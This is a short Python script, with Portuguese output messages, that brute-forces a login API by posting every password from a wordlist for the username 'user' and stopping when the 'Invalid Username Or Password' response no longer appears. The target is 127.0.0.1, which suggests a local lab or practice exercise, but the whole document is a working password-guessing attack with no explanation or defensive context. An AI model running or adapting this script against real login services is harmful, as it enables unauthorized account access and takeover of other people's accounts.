import requests

url = "http://127.0.0.1/api/user/login"
headers = {"Content-Type": "application/json"}

with open("wordlist", "r") as f:
    for password in f:
        password = password.strip()
        payload = {"username": "user", "password": password}
        
        response = requests.post(url, json=payload, headers=headers)
        
        if "Invalid Username Or Password" not in response.text:
            print(f"[+] Senha encontrada: {password}")
            break
        else:
            print(f"[-] Senha incorreta: {password}")
